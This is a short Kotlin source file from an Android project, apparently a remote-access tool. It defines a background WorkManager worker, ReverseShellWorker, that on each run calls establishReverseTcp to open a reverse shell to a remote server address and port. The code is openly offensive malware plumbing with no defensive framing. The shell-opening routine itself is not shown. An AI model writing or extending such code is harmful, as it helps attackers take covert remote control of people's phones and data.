package com.satwik.smile.features.reverse_shell

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters


class ReverseShellWorker(appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

    @RequiresApi(Build.VERSION_CODES.O)
    override suspend fun doWork(): Result {
        println("Reverse shell worker started")
        establishReverseTcp(RemoteServer.IPADDRESS, RemoteServer.PORT, 10000, applicationContext)
        return Result.success()
    }
}
